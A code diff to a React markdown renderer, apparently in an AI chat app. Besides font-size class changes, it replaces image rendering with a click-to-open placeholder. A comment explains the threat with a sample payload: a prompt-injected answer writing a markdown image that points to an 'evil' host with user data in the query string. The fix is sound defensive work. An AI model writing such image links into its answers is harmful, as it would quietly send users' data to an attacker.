@@ -2,6 +2,7 @@ import { memo, useRef, type ReactNode } from "react";
 import ReactMarkdown, { type Components } from "react-markdown";
 import remarkGfm from "remark-gfm";
 import remarkBreaks from "remark-breaks";
+import { Image as ImageIcon } from "lucide-react";
 import { CopyButton } from "@/ai/copyButton.tsx";
 import { splitPoint } from "@/ai/streamSplit.ts";
 
@@ -24,10 +25,10 @@ import { splitPoint } from "@/ai/streamSplit.ts";
 const components: Components = {
     p: ({ children }) => <p className="mb-2 last:mb-0 leading-relaxed">{children}</p>,
 
-    h1: ({ children }) => <h1 className="mt-3 first:mt-0 mb-1.5 text-[14px] font-semibold text-tone-900">{children}</h1>,
-    h2: ({ children }) => <h2 className="mt-3 first:mt-0 mb-1.5 text-[13.5px] font-semibold text-tone-900">{children}</h2>,
-    h3: ({ children }) => <h3 className="mt-3 first:mt-0 mb-1 text-[13px] font-semibold text-tone-850">{children}</h3>,
-    h4: ({ children }) => <h4 className="mt-2.5 first:mt-0 mb-1 text-[12.5px] font-semibold text-tone-800">{children}</h4>,
+    h1: ({ children }) => <h1 className="mt-3 first:mt-0 mb-1.5 text-14 font-semibold text-tone-900">{children}</h1>,
+    h2: ({ children }) => <h2 className="mt-3 first:mt-0 mb-1.5 text-13.5 font-semibold text-tone-900">{children}</h2>,
+    h3: ({ children }) => <h3 className="mt-3 first:mt-0 mb-1 text-13 font-semibold text-tone-850">{children}</h3>,
+    h4: ({ children }) => <h4 className="mt-2.5 first:mt-0 mb-1 text-12.5 font-semibold text-tone-800">{children}</h4>,
 
     ul: ({ children }) => <ul className="mb-2 last:mb-0 pl-4 list-disc marker:text-tone-250 space-y-0.5">{children}</ul>,
     ol: ({ children }) => <ol className="mb-2 last:mb-0 pl-4 list-decimal marker:text-tone-250 space-y-0.5">{children}</ol>,
@@ -58,19 +59,49 @@ const components: Components = {
         </a>
     ),
 
+    // Never an <img>. Rendering one fetches its URL with no click, and a
+    // prompt-injected answer can write `![](https://evil/?d=<your data>)` —
+    // the request itself is the leak. A labelled placeholder instead, opened
+    // in the browser only if you choose to. A span rather than a link, since
+    // an image can sit inside a link and links can't nest.
+    img: ({ src, alt }) => {
+        const url = typeof src === "string" ? src : "";
+        return (
+            <span
+                role="link"
+                tabIndex={0}
+                title={url ? `Image not loaded — open ${url}` : "Image not loaded"}
+                onClick={(e) => {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    if (url) window.electron.openExternal(url);
+                }}
+                onKeyDown={(e) => {
+                    if (e.key !== "Enter" || !url) return;
+                    e.preventDefault();
+                    window.electron.openExternal(url);
+                }}
+                className="inline-flex items-center gap-1 max-w-full px-1.5 py-0.5 rounded border border-line-080 bg-fill-050 text-11 text-sky-300/75 hover:text-sky-300 align-middle cursor-pointer"
+            >
+                <ImageIcon size={11} className="shrink-0" />
+                <span className="truncate">{alt || "Image"}</span>
+            </span>
+        );
+    },
+
     code: ({ className, children, ...props }) => {
         // react-markdown marks fenced blocks with a language- class; anything
         // without one is an inline span.
         const isBlock = /language-/.test(className ?? "");
         if (!isBlock) {
             return (
-                <code className="px-1 py-0.5 rounded bg-fill-070 border border-line-060 font-mono text-[11px] text-amber-100/75 break-words">
+                <code className="px-1 py-0.5 rounded bg-fill-070 border border-line-060 font-mono text-11 text-amber-100/75 break-words">
                     {children}
                 </code>
             );
         }
         return (
-            <code className={`${className ?? ""} font-mono text-[11px] leading-relaxed text-tone-800`} {...props}>
+            <code className={`${className ?? ""} font-mono text-11 leading-relaxed text-tone-800`} {...props}>
                 {children}
             </code>
         );
@@ -85,7 +116,7 @@ const components: Components = {
             {/* min-w-full, not w-full: w-full pinned the table to the wrapper so
                 it could never overflow, which made the scroll container
                 decorative and crushed wide tables into the available space. */}
-            <table className="min-w-full border-collapse text-[11.5px]">{children}</table>
+            <table className="min-w-full border-collapse text-11.5">{children}</table>
         </div>
     ),
     thead: ({ children }) => <thead className="bg-fill-050">{children}</thead>,
@@ -167,7 +198,7 @@ export const StreamingMarkdown = memo(function StreamingMarkdown({ children }: {
  */
 export const Markdown = memo(function Markdown({ children }: { children: string }) {
     return (
-        <div className="text-[12.5px] leading-relaxed text-tone-750 break-words">
+        <div className="text-12.5 leading-relaxed text-tone-750 break-words">
             <ReactMarkdown remarkPlugins={[remarkGfm, remarkBreaks]} components={components}>
                 {children}
             </ReactMarkdown>
